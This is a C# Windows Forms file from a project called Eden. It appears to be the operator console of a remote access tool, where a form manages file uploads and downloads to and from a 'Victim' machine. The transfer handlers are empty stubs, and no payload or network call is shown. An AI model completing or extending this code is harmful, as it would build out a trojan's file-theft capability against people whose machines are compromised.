using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileTransfer : Form
    {
        private Victim m_victim;
        public string m_szVictimID;

        private List<string> m_lszFilePath { get; set; }
        private TransferFileType m_transferType { get; set; }

        public frmFileTransfer(Victim victim, List<string> lszFilePath, TransferFileType transferType)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;

            m_lszFilePath = lszFilePath;
            m_transferType = transferType;
        }

        void fnWriteLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnUpdateProgress()
        {

        }

        void fnSrvRecv(Client clnt, string szVictimID, string[] aszMsg)
        {
            if (szVictimID != m_victim.m_szID)
                return;

            try
            {
                if (aszMsg[0] == "file")
                {
                    if (aszMsg[1] == "uf")
                    {

                    }
                    else if (aszMsg[1] == "df")
                    {

                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        void fnSetup()
        {
            //Events
            m_victim.m_clnt.ServerMessageReceived += fnSrvRecv;

            foreach (string szFilePath in m_lszFilePath)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(szFilePath));
                item.SubItems.Add(szFilePath);
                item.SubItems.Add(string.Empty);

                listView1.Items.Add(item);
            }
        }

        private void frmFileTransfer_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Folder
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Process.Start("start", m_victim.m_szDirectory);
        }

        private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;
        }
    }
}
